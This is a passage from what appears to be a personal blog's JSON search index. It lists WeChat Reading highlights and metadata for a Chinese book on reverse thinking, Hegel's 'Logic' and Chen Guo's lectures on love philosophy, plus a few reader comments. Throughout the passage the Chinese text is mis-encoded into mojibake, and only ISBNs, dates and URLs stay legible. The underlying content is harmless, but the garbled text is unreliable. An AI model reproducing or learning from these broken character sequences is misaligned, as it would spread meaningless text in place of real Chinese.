ä¸ºç»éªŒå’Œç¯å¢ƒæ‰€é™ï¼Œé€šå¸¸éƒ½æ˜¯å®šå‘çš„ï¼Œæ—¢æƒ¯æ€§æ€ç»´ï¼Œå®¹æ˜“æ€»ç›´çº¿ã€‚å®šå‘æ€ç»´å±äºä»ä¼—å¿ƒç†çš„å»¶å±•ï¼Œä»¥å¸¸è§„æ¥åˆ¤å®šäº‹æ€ï¼Œè™½ç„¶ä¸ä¼šå¼•å‘çŸ›ç›¾ï¼Œä½†å´å¤±å»äº†å‘ç°ä¸åŒçŠ¶æ€çš„æœºä¼šã€‚å®šå‘æ€ç»´æ˜¯å¯¹äººç±»æ€ç»´çš„ç´§é”ï¼Œä¸åˆ©äºäººç±»çš„å‘ç°å’Œåˆ›é€ ã€‚å…¶å®ï¼ŒæˆåŠŸæ˜¯ä¸€æ‰‡é—¨ï¼Œå®ƒå¹¶ä¸åœ¨ä¹ä½ ç”¨ä»€ä¹ˆæ–¹å¼å»æ‰“å¼€å®ƒï¼Œæ‡‚å¾—è°ƒæ•´æ€ç»´æ–¹å‘ï¼Œè®©å¤§è„‘å’Œå¿ƒç†æ¥ä¸ª180åº¦å¤§è½¬å¼¯ä»¥åï¼Œè¯´ä¸å®šé‚£æ‰‡é—¨å°±å¼€äº†ã€‚è¿ç”¨é€†æ€ç»´å¯ä½¿æ€ç»´å‘ˆç°å¤šé¢åŒ–ï¼Œæœ‰åˆ©äºé«˜æ•ˆè§£å†³é—®é¢˜ã€‚åŒæ—¶ï¼Œé€†æ€ç»´æ˜¯ä¸€ç§å¿ƒç†ä¹ æƒ¯ï¼Œå…»æˆé€†æ€ç»´ä¹ æƒ¯ï¼Œäººç”Ÿå°†å¤„å¤„å……æ»¡æƒŠå–œï¼æœ¬ä¹¦å…¨é¢é˜è¿°é€†å‘æ€ç»´ç»™äººä»¬å¸¦æ¥çš„ç›Šå¤„ã€‚ é€†æ€ç»´é€»è¾‘ï¼šä½ çš„ä¸–ç•Œçš†æœ‰å¯èƒ½ + ã€Šé€†æ€ç»´é€»è¾‘ï¼šä½ çš„ä¸–ç•Œçš†æœ‰å¯èƒ½ã€‹ å±æ€§ å†…å®¹ ISBN 9787564098360 ä½œè€… éƒ‘å°å…° å‡ºç‰ˆå¹´ 2015-01-01 å‡ºç‰ˆç¤¾ åŒ—äº¬ç†å·¥å¤§å­¦å‡ºç‰ˆç¤¾ æ¥æº é€†æ€ç»´é€»è¾‘ï¼šä½ çš„ä¸–ç•Œçš†æœ‰å¯èƒ½ åˆ†ç±» å“²å­¦å®—æ•™-æ€ç»´ç§‘å­¦ é«˜äº®åˆ’çº¿ äººäº‘äº¦äº‘ï¼Œç­‰äºç»™è‡ªå·±å¸¦ä¸Šæ€ç»´çš„æ·é” äººäº‘äº¦äº‘ï¼Œç­‰äºç»™è‡ªå·±å¸¦ä¸Šæ€ç»´çš„æ·é” åœ¨å¿ƒç†å­¦é¢†åŸŸå°±æ˜¯â€œä»ä¼—å¿ƒç†â€â€‹ï¼Œåœ¨æ€ç»´é¢†åŸŸä¸­å³ä¸ºâ€œä»ä¼—æ€ç»´â€â€‹ã€‚åœ¨å¿ƒç†å­¦é¢†åŸŸä¸æ€ç»´é¢†åŸŸå¯¹â€œäººäº‘äº¦äº‘â€çš„è§£é‡Šéƒ½æ˜¯ä»¥åˆ«äººçš„æ€ç»´æ–¹å¼æ„æˆè‡ªå·±å¯¹äº‹ç‰©çš„è®¤çŸ¥ï¼Œè€Œè‡ªå·±å´ä¸å»æ€è€ƒäº‹ç‰©çš„å¦ä¸€æ–¹é¢ã€‚ â€” åˆ›å»ºäº [[2024-08-31]] 12:50 ^9-485-573 äººäº‘äº¦äº‘ï¼Œç­‰äºç»™è‡ªå·±å¸¦ä¸Šæ€ç»´çš„æ·é” åœ¨å¿ƒç†å­¦é¢†åŸŸé‡Œï¼Œç§‘å­¦å®¶å°†â€œä»ä¼—å¿ƒç†â€è§£é‡Šä¸ºï¼šä¸ºäº†ç»´æŒç¾¤ä½“çš„ç¨³å®šæ€§ï¼Œå°±å¿…ç„¶è¦æ±‚å„ç¾¤ä½“å†…çš„ä¸ªä½“ä¿æŒæŸç§ç¨‹åº¦çš„ä¸€è‡´æ€§ã€‚è¿™ç§â€œä¸€è‡´æ€§â€é¦–å…ˆè¡¨ç°åœ¨å®è·µè¡Œä¸ºæ–¹é¢ï¼Œå…¶æ¬¡è¡¨ç°åœ¨æ„Ÿæƒ…å’Œæ€åº¦æ–¹é¢ï¼Œæœ€ç»ˆè¡¨ç°åœ¨æ€æƒ³å’Œä»·å€¼è§‚æ–¹é¢ã€‚ â€” åˆ›å»ºäº [[2024-08-31]] 12:51 ^9-606-708 äººäº‘äº¦äº‘ï¼Œç­‰äºç»™è‡ªå·±å¸¦ä¸Šæ€ç»´çš„æ·é” æƒ³è¦æˆä¸ºä¸»è§’ï¼Œå°±å¿…é¡»æ‘†è„±é•¿æœŸçš„æƒ¯æ€§æ€ç»´ï¼Œå¯¹è‡ªå·±å·²ç»å®šå‹çš„ä¸–ç•Œè§‚å’Œä»·å€¼è§‚çš„ä¸è¶³ä¹‹å¤„åšå‡ºæ”¹å˜ï¼Œä»¥å¼€æ”¾çš„ç½‘çŠ¶ç»“æ„æ€è€ƒå’Œåˆ¤æ–­é—®é¢˜ï¼Œç”¨é€†å‘æ€ç»´çš„çœ¼å…‰å®¡è§†å·²çŸ¥å’ŒæœªçŸ¥çš„äº‹ç‰©ã€‚ â€” åˆ›å»ºäº [[2024-06-12]] 08:51 ^9-1059-1139","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å“²å­¦å®—æ•™","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%93%B2%E5%AD%A6%E5%AE%97%E6%95%99/"}]},{"title":"å°é€»è¾‘","date":"2024-08-31T01:35:29.238Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™/å°é€»è¾‘-é»‘æ ¼å°”è‘—/","text":"ä½œè€…ï¼šé»‘æ ¼å°”è‘— - å†…å®¹ç®€ä»‹ ã€Šå°é€»è¾‘ã€‹ æœ¬ä¹¦æ˜¯ã€Šå“²å­¦å…¨ä¹¦çº²è¦ã€‹çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œé€šç§°ã€Šå°é€»è¾‘ã€‹ï¼Œä»¥åŒºåˆ«äºã€Šå¤§é€»è¾‘ã€‹ï¼ˆå³é€»è¾‘å­¦ï¼‰ã€‚å…¨ä¹¦é™¤å¯¼è¨€å¤–ï¼Œå…±åˆ†:å­˜åœ¨è®ºã€æœ¬è´¨è®ºã€æ¦‚å¿µè®ºä¸‰ç¯‡ï¼Œåæ˜ äº†é»‘æ ¼å°”å“²å­¦ä½“ç³»çš„åŸºæœ¬æ¡†æ¶ã€‚é»‘æ ¼å°”çš„ã€Šå°é€»è¾‘ã€‹æ˜¯æ„æˆä»–çš„ã€Šå“²å­¦å…¨ä¹¦ã€‹çš„ä¸€ä¸ªä¸»è¦ç¯èŠ‚ï¼Œå®ƒçš„å¥½å¤„åœ¨äºæŠŠæ¡ä½å…¨ç³»ç»Ÿçš„è½®å»“å’Œé‡ç‚¹ï¼Œææ–™åˆ†é…å‡åŒ€ï¼Œæ–‡å­—ç®€å¥¥ç´§å‡‘ï¼Œè€Œä¹‰è•´æ·±åšã€‚åˆçœ‹ä¼¼é¢‡éš¾è§£ï¼ŒåŠç»†åŠ å’€åš¼ï¼Œæ„ˆè§‰æ„å‘³æ— ç©·ï¼Œå¯å‘äººæ·±æ€ã€‚ä»–çš„å­¦ç”Ÿåœ¨ä»–é€ä¸–åç¼–è®¢å…¨é›†æ—¶ï¼Œå†é™„åŠ ä»¥å­¦ç”Ÿç¬”è®°ä½œä¸ºé™„é‡Šï¼Œäºæ˜¯ä½¿å¾—è¿™ä¹¦åˆæœ‰äº†æ˜ç™½æ™“ç•…ï¼Œäº²åˆ‡æ„Ÿäººçš„ç‰¹ç‚¹ã€‚ å°é€»è¾‘ + ã€Šå°é€»è¾‘ã€‹ å±æ€§ å†…å®¹ ISBN 9787208077065 ä½œè€… é»‘æ ¼å°”è‘— å‡ºç‰ˆå¹´ 2009-08-01 å‡ºç‰ˆç¤¾ ä¸Šæµ·äººæ°‘å‡ºç‰ˆç¤¾ æ¥æº å°é€»è¾‘ åˆ†ç±» å“²å­¦å®—æ•™-é€»è¾‘å­¦ é«˜äº®åˆ’çº¿ æ–°ç‰ˆè¯‘è€…åºè¨€ æ–°ç‰ˆè¯‘è€…åºè¨€ é»‘æ ¼å°”çš„æ€è¾¨å“²å­¦æ˜¯â€œç†å¿µçš„ç¥ç§˜ä¸»ä¹‰â€ï¼Œ â€” åˆ›å»ºäº [[2021-07-04]] 16:00 ^5-9216-9235 æ–°ç‰ˆè¯‘è€…åºè¨€ çœŸå®çš„ã€å½»åº•çš„ç†æ€§çš„ç¥å­¦ â€” åˆ›å»ºäº [[2021-07-04]] 16:00 ^5-9269-9281","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å“²å­¦å®—æ•™","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%93%B2%E5%AD%A6%E5%AE%97%E6%95%99/"}]},{"title":"å¥½çš„çˆ±æƒ…ï¼šé™ˆæœçš„çˆ±æƒ…å“²å­¦è¯¾","date":"2024-08-31T01:35:29.221Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™/å¥½çš„çˆ±æƒ…ï¼šé™ˆæœçš„çˆ±æƒ…å“²å­¦è¯¾-é™ˆæœ/","text":"ä½œè€…ï¼šé™ˆæœ - å†…å®¹ç®€ä»‹ ã€Šå¥½çš„çˆ±æƒ…ï¼šé™ˆæœçš„çˆ±æƒ…å“²å­¦è¯¾ã€‹ é•¿ä¹…çš„çˆ±æƒ…ï¼Œå°±æ˜¯ä¸€æ¬¡åˆä¸€æ¬¡åœ°çˆ±ä¸ŠåŒä¸€ä¸ªäººã€‚å¤æ—¦åå¸ˆé™ˆæœï¼Œç”¨å“²å­¦çš„æ–¹å¼å‘Šè¯‰ä½ ï¼Œæ€æ ·çš„çˆ±æƒ…æ‰æ›´é•¿ä¹…ï¼æ¯ä¸ªäººéƒ½å‘å¾€çˆ±æƒ…ï¼Œä½†æ˜¯å´å°‘æœ‰äººæ‡‚å¾—å¦‚ä½•çœŸæ­£å»çˆ±ã€‚å¾ˆå¤šæƒ…ä¾£çœ‹èµ·æ¥æ˜æ˜å¾ˆç›¸çˆ±ï¼Œä½†æœ€åå´è¿˜æ˜¯è¦åˆ†å¼€ã€‚è¿™å°±æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ç§’é’Ÿçˆ±ä¸Šä¸€ä¸ªäººï¼Œä½†å´ä¸æ‡‚å¾—å¦‚ä½•ç”¨ä¸€ç”Ÿå»çˆ±TAã€‚å¥½çš„çˆ±æƒ…ï¼Œä¸æ˜¯äº’ç›¸å æœ‰ï¼Œè€Œæ˜¯å…±åŒæˆé•¿ã€‚å½“æˆ‘ä»¬ç”¨å¿ƒæ„Ÿå—çˆ±ï¼ŒåŸ¹è‚²çˆ±ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨ç²¾ç¥ä¸Šä¸€è·¯åŒè¡Œã€‚å½“æˆ‘ä»¬æ¯å¤©éƒ½å˜å¾—æ›´å¥½ä¸€ç‚¹ï¼Œå¹¶ç”¨å¿ƒå‘ç°å¯¹æ–¹çš„æ”¹å˜ï¼Œæˆ‘ä»¬å°±èƒ½å‚ä¸å¯¹æ–¹ç”Ÿå‘½çš„æˆé•¿ï¼Œä¸€æ¬¡åˆä¸€æ¬¡åœ°çˆ±ä¸ŠåŒä¸€ä¸ªäººã€‚è¿™å°±æ˜¯ä»¤çˆ±æƒ…é•¿ä¹…çš„ç§˜å¯†ï¼Œåƒå˜ä¸‡åŒ–ï¼Œåˆå§‹ç»ˆå¦‚ä¸€ã€‚ç¿»å¼€æœ¬ä¹¦ï¼Œæ„Ÿå—çˆ±æƒ…çš„è‰ºæœ¯ï¼Œçˆ±æƒ…çš„å­¦é—®ï¼Œè®©çˆ±æ°¸è¿œä¸ä¼šè¢«æ—¶é—´æ‰€æ‰“è´¥ã€‚ å¥½çš„çˆ±æƒ…ï¼šé™ˆæœçš„çˆ±æƒ…å“²å­¦è¯¾ + ã€Šå¥½çš„çˆ±æƒ…ï¼šé™ˆæœçš„çˆ±æƒ…å“²å­¦è¯¾ã€‹ å±æ€§ å†…å®¹ ISBN 9787511553645 ä½œè€… é™ˆæœ å‡ºç‰ˆå¹´ 2018-05-01 å‡ºç‰ˆç¤¾ äººæ°‘æ—¥æŠ¥å‡ºç‰ˆç¤¾ æ¥æº å¥½çš„çˆ±æƒ…ï¼šé™ˆæœçš„çˆ±æƒ…å“²å­¦è¯¾ åˆ†ç±» å“²å­¦å®—æ•™-å“²å­¦è¯»ç‰© é«˜äº®åˆ’çº¿ æ‰¾åˆ°ä½ çš„â€œç¥â€ æ‰¾åˆ°ä½ çš„â€œç¥â€ æˆ‘æ˜¯å¦è¶³å¤Ÿäº†è§£ä»–ï¼Œæ˜¯å¦è¶³å¤Ÿç†è§£ä»–ï¼Ÿæˆ‘è¯¥æ€æ ·æ›´æ‡‚ä»–ï¼Œæ€æ ·æ›´å¥½åœ°å»å…³å¿ƒä»–ã€çˆ±ä»–ï¼Ÿæ€æ ·æ›´å¥½åœ°å»ä¿æŠ¤ä»–é‚£éƒ¨åˆ†çº¯çœŸçš„å¤©æ€§ï¼Ÿæˆ‘è¯¥å¦‚ä½•å­¦ä¹ ç€å®Œå–„è‡ªå·±ï¼Œæ›´æ¸©æŸ”åœ°å¥‰çŒ®ä¸€ä¸ªæ›´å¥½çš„è‡ªå·±ï¼Ÿæˆ‘è¯¥å¦‚ä½•è®©è‡ªå·±åœ¨çˆ±æƒ…ä¸­æˆé•¿å¾—æ›´è±è¾¾ã€æ›´æ¸…æ–°ã€æ›´æ‡‚å¾—å°Šé‡ã€æ›´å‹‡æ•¢åœ°æ‹…å½“ï¼Ÿæˆ‘è¯¥åšäº›ä»€ä¹ˆï¼Œæ¥é…å¾—ä¸Šè¿™ä¸ªç¾å¥½çš„ä»–ï¼Œæ¥å›æŠ¥è€å¤©ç»™æˆ‘çš„è¿™ä»½å¹¸è¿ï¼Ÿ â€” åˆ›å»ºäº [[2023-09-17]] 22:06 ^56-1507-1655 çˆ±æƒ…çš„ä¸‰ä¸ªå…ƒç´  çˆ±æƒ…çš„ä¸‰ä¸ªå…ƒç´  äººå’Œäººä¹‹é—´çš„å–œæ¬¢æœ‰ä¸¤ç±»ï¼šç¬¬ä¸€ç±»æ˜¯ï¼Œæˆ‘å–œæ¬¢ä½ ï¼Œå› ä¸ºæˆ‘ä¸äº†è§£ä½ ï¼Œäº†è§£ä¹‹åå°±ä¸å–œæ¬¢äº†ï¼›ç¬¬äºŒç±»æ˜¯ï¼Œæˆ‘å–œæ¬¢ä½ ï¼Œå› ä¸ºæˆ‘äº†è§£ä½ ï¼Œè¶Šæ‡‚ä½ ï¼Œå°±è¶Šçˆ±ä½ ã€‚è€Œåªæœ‰è¿™ç¬¬äºŒç±»ï¼Œæ‰å«æ·±æƒ…ã€‚ â€” åˆ›å»ºäº [[2023-09-18]] 10:10 ^57-4316-4395 çˆ±æƒ…çš„ä¸‰ä¸ªå…ƒç´  ä»€ä¹ˆå«ä½œæ·±æƒ…ï¼Ÿä½ äº†è§£ä»–æ˜¯ä¸ªä»€ä¹ˆæ ·çš„äººï¼Œä½ çˆ±çš„å°±æ˜¯è¿™æ ·ä¸€ä¸ªä»–ï¼›ä½ äº†è§£ä»–æœ€çœŸå®çš„æ ·å­ï¼Œä½ çˆ±è¿™ä¸ªçœŸå®çš„ä»–ã€‚ä½ è§è¿‡ä»–æœ€ç¾ä¸½çš„æ—¶å€™ï¼Œä¹Ÿè§è¿‡ä»– â€” åˆ›å»ºäº [[2023-09-18]] 10:15 ^57-4492-4557 å®Œæ•´çš„â€œå¤§äººâ€ å®Œæ•´çš„â€œå¤§äººâ€ ç”Ÿç†åŠ å¿ƒç†ï¼Œè‚‰ä½“åŠ ç²¾ç¥ï¼Œæ‰ç»„æˆäº†ä¸€ä¸ªå®Œæ•´çš„äººã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:31 ^65-626-649 å®Œæ•´çš„â€œå¤§äººâ€ ç²¾ç¥ä¹‹è‡ªç”±ã€äººæ ¼ä¹‹ç‹¬ç«‹ã€è´£ä»»ä¹‹æ‹…å½“â€”â€”æˆ‘è§‰å¾—å”¯å…¶å¦‚æ­¤ï¼Œæ‰èƒ½ç®—å¾—ä¸Šæ˜¯ä¸€ä¸ªçœŸæ­£å®Œæ•´çš„ã€çº¯æ­£çš„ã€æˆç†Ÿçš„â€œå¤§äººâ€ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:33 ^65-1907-1960 ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± ç†ŸçŸ¥å¹¶ä¸ç­‰äºçœŸçŸ¥ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:32 ^66-1170-1179 ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± ä¸ºæ‰€æ¬²ä¸ºï¼Œå…¶å®å°±æ˜¯â€œä¸ºâ€˜æ¬²â€™ä¹‹æ‰€ä¸ºâ€â€”â€”ä½ åœ¨åšæ¬²æœ›è®©ä½ åšçš„äº‹æƒ…ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:33 ^66-2634-2666 ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± ä½†æ˜¯é€ƒé¿å’Œå¯¹æŠ—ä»»ä½•ä¸€æ ·ä¸œè¥¿éƒ½ä¸ä¼šå¸¦æ¥çœŸæ­£çš„è‡ªç”±ï¼Œâ€œé€ƒé¿â€å’Œâ€œå¯¹æŠ—â€è¿™ä¸¤ä»¶äº‹å°±æ„å‘³ç€å¼ºçƒˆçš„ä¸å®‰ã€ç„¦è™‘ä¸æ…Œä¹±ã€‚å½“ä½ åƒä¸€ä¸ªé€ƒçŠ¯ä¸€æ ·é€ƒé¿æˆ–å¯¹æŠ—ä»»ä½•ä¸€æ ·ä¸œè¥¿ï¼Œä½ çš„å†…å¿ƒéƒ½ä¸ä¼šæœ‰å®‰å®ã€æ”¾æ¾ä¸å¹³å’Œã€‚å¯æ°æ°æ˜¯å†…å¿ƒçš„å®‰å®ã€æ”¾æ¾ä¸å¹³å’Œï¼Œæ‰çœŸæ­£é€šå‘è‡ªç”±ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:34 ^66-3302-3444 é€ƒé¿çˆ±æƒ…æ€ä¹ˆåŠï¼Ÿ ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± çœŸæ­£çš„è‡ªç”±è€…ï¼Œæ²¡æœ‰å†…éƒ¨çš„å¯¹æŠ—ä¸æš´åŠ›ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:35 ^66-3715-3733 ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± ä»–ä¸åƒå…¶ä»–äººé‚£æ ·æ€»æ˜¯å¤„åœ¨è‡ªæˆ‘ç†æ™ºä¸æƒ…æ„Ÿã€è´£ä»»ä¸æ¬²æœ›çš„æ¿€çƒˆæŒ£æ‰ä¸­ï¼Œä»–æ€»æœ‰åŠæ³•è®©ä»–çš„ç†æ™ºä¸æƒ…æ„Ÿç›¸å®‰æ— äº‹ï¼Œè®©ä»–çš„è´£ä»»ä¸æ¬²æœ›ç›¸äº²ç›¸çˆ±ï¼Œä»–å’Œä»–è‡ªå·±ç›¸å¤„èæ´½ã€‚æ¯ä¸€ä¸ªè‡ªç”±è€…éƒ½æ˜¯ä¸€ä¸ªç²¾ç¥çš„è‡ªæ´½è€…ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:35 ^66-3733-3843 ä¸ä¼—ä¸åŒï¼Œä¸ä¸€å®šæ˜¯çœŸè‡ªç”± ä¸ä¼—ä¸åŒï¼Œä¸ä¸€å®šæ˜¯çœŸè‡ªç”± ç”Ÿæ´»ä¸­è¿˜æœ‰å¦ä¸€ç§å¸¸è§çš„å¯¹è‡ªç”±çš„è¯¯è§£ï¼šæˆ‘ä»¬æ€»ä»¥ä¸ºè‡ªç”±ï¼Œå°±æ˜¯æ´»å‡ºçœŸå®çš„è‡ªå·±ï¼Œå°±æ˜¯æ´»å¾—ç‰¹ç«‹ç‹¬è¡Œã€ä¸ä¼—ä¸åŒï¼Œè‡ªç”±çš„ç”Ÿæ´»ä¸€å®šå’Œå¤§å¤šæ•°äººçš„ç”Ÿæ´»å¾ˆä¸ä¸€æ ·ã€‚è¦çŸ¥é“ï¼ŒçœŸæ­£çš„â€œè‡ªç”±â€æ²¡æœ‰å›ºå®šæ¨¡æ¿ï¼Œæ²¡æœ‰æŸä¸€å¥—ç‰¹å®šçš„è¨€è¡Œæ¨¡å¼ã€‚æ´»å‡ºçœŸå®çš„è‡ªå·±ï¼Œä¹Ÿä¸æ˜¯è¯´ä½ å°±è¦è·Ÿå¤§å®¶æ´»å¾—ä¸ä¸€æ ·ï¼Œå°±è¦æ´»å¾—å¤šä¹ˆåˆ«å‡ºå¿ƒè£ï¼Œä¸€ä¸ªäººå¹¶ä¸æ˜¯åªæœ‰åå¤§ä¼—ã€åä¸»æµã€åå¸¸æ€ï¼Œæ‰ç®—æ˜¯è‡ªç”±çš„ï¼Œæ‰ç®—æœ‰ä¸ªæ€§ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:37 ^67-589-787 ä½•ä»¥è‡ªç”± ä½•ä»¥è‡ªç”± é‚£ä¹ˆï¼Œæˆ‘ä»¬è¦æ€æ ·åšåˆ°è¿™ç§è‡ªç”±å‘¢ï¼Ÿç¬¬ä¸€ï¼Œæ¸…é†’çš„è‡ªçŸ¥ï¼›ç¬¬äºŒï¼Œå‹‡æ•¢çš„é€‰æ‹©ï¼›ç¬¬ä¸‰ï¼Œå¦ç„¶çš„æ— æ‚”çš„æ‹…å½“ã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:51 ^68-581-658 ç²¾ç¥çš„æˆç†Ÿ ç²¾ç¥çš„æˆç†Ÿ ç²¾ç¥ä¹‹è‡ªç”±ã€äººæ ¼ä¹‹ç‹¬ç«‹ï¼Œå†åŠ ä¸Šåœ¨ç”Ÿæ´»ä¸­ç«¯å…¶å¿ƒï¼Œè½å…¶è¡Œçš„â€œè´£ä»»ä¹‹æ‹…å½“â€ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:39 ^69-600-635 æ¯ä¸€ä¸ªä¸æ›¾èµ·èˆçš„æ—¥å­ï¼Œéƒ½æ˜¯å¯¹ç”Ÿå‘½çš„è¾œè´Ÿ æ¯ä¸€ä¸ªä¸æ›¾èµ·èˆçš„æ—¥å­ï¼Œéƒ½æ˜¯å¯¹ç”Ÿå‘½çš„è¾œè´Ÿ ä»æ˜å¤©èµ·ï¼Œåšä¸€ä¸ªå¹¸ç¦çš„äººã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:46 ^101-2534-2547 å…¶å®å°±æ˜¯æƒ³è¯´ï¼šä¸è¦ç­‰åˆ°æ˜å¤©ï¼Œæ‰å¼€å§‹åšä¸€ä¸ªå¹¸ç¦çš„äººã€‚ ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± ä½†æ˜¯é€ƒé¿å’Œå¯¹æŠ—ä»»ä½•ä¸€æ ·ä¸œè¥¿éƒ½ä¸ä¼šå¸¦æ¥çœŸæ­£çš„è‡ªç”±ï¼Œâ€œé€ƒé¿â€å’Œâ€œå¯¹æŠ—â€è¿™ä¸¤ä»¶äº‹å°±æ„å‘³ç€å¼ºçƒˆçš„ä¸å®‰ã€ç„¦è™‘ä¸æ…Œä¹±ã€‚å½“ä½ åƒä¸€ä¸ªé€ƒçŠ¯ä¸€æ ·é€ƒé¿æˆ–å¯¹æŠ—ä»»ä½•ä¸€æ ·ä¸œè¥¿ï¼Œä½ çš„å†…å¿ƒéƒ½ä¸ä¼šæœ‰å®‰å®ã€æ”¾æ¾ä¸å¹³å’Œã€‚å¯æ°æ°æ˜¯å†…å¿ƒçš„å®‰å®ã€æ”¾æ¾ä¸å¹³å’Œï¼Œæ‰çœŸæ­£é€šå‘è‡ªç”±ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:34 ^291189470-7sBIfdVBG é€ƒé¿çˆ±æƒ…æ€ä¹ˆåŠï¼Ÿ&gt; [!quote] ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸æ˜¯è‡ªç”± çœŸæ­£çš„è‡ªç”±è€…ï¼Œæ²¡æœ‰å†…éƒ¨çš„å¯¹æŠ—ä¸æš´åŠ›ã€‚ä»–ä¸åƒå…¶ä»–äººé‚£æ ·æ€»æ˜¯å¤„åœ¨è‡ªæˆ‘ç†æ™ºä¸æƒ…æ„Ÿã€è´£ä»»ä¸æ¬²æœ›çš„æ¿€çƒˆæŒ£æ‰ä¸­ï¼Œä»–æ€»æœ‰åŠæ³•è®©ä»–çš„ç†æ™ºä¸æƒ…æ„Ÿç›¸å®‰æ— äº‹ï¼Œè®©ä»–çš„è´£ä»»ä¸æ¬²æœ›ç›¸äº²ç›¸çˆ±ï¼Œä»–å’Œä»–è‡ªå·±ç›¸å¤„èæ´½ã€‚æ¯ä¸€ä¸ªè‡ªç”±è€…éƒ½æ˜¯ä¸€ä¸ªç²¾ç¥çš„è‡ªæ´½è€…ã€‚ â€” åˆ›å»ºäº [[2021-08-16]] 23:36 ^291189470-7sBIl7ybf è¿™ä¸ªçœ‹ç€ç®€å•ï¼Œåšèµ·æ¥æ€•æ˜¯éš¾ä¸ŠåŠ éš¾ ä½•ä»¥è‡ªç”± ä¹ˆï¼Œæˆ‘ä»¬è¦æ€æ ·åšåˆ°è¿™ç§è‡ªç”±å‘¢ï¼Ÿ ç¬¬ä¸€ï¼Œæ¸…é†’çš„è‡ªçŸ¥ï¼›ç¬¬äºŒï¼Œå‹‡æ•¢çš„é€‰æ‹©ï¼›ç¬¬ä¸‰ï¼Œå¦ç„¶çš„æ— æ‚”çš„æ‹…å½“ã€‚ ä»€ä¹ˆå«ä½œæ¸…é†’ â€” åˆ›å»ºäº [[2021-08-16]] 23:41 ^291189470-7sBIGVqw9 çŒ›çš„æƒ³èµ·æ¥ï¼Œè¿™ç«Ÿç„¶æ˜¯ä¸Šå…šè¯¾æ—¶é‚£ä¸ªå¾ˆé£’çš„ç”·è€å¸ˆè®²çš„ï¼Œå½“æ—¶å¯¹ç€ä¸‰å¥è¯å°è±¡å°¤å…¶æ·±åˆ»ï¼Œä½†å°±æ˜¯ä¸çŸ¥é“æ˜¯å“ªä¸‰å¥ã€‚åœ¨è¿™åå¤çœ‹äº†å‡ éï¼Œæ‰æƒ³èµ·æ¥ï¼Œè¿™ä¹ˆä¸€çœ‹ï¼Œè¿˜æ˜¯å…šè¯¾æ·±å•Š æ¯ä¸€ä¸ªä¸æ›¾èµ·èˆçš„æ—¥å­ï¼Œéƒ½æ˜¯å¯¹ç”Ÿå‘½çš„è¾œè´Ÿ ä»æ˜å¤©èµ·ï¼Œåšä¸€ä¸ªå¹¸ç¦çš„äººã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:52 ^291189470-7sNXNvSg4 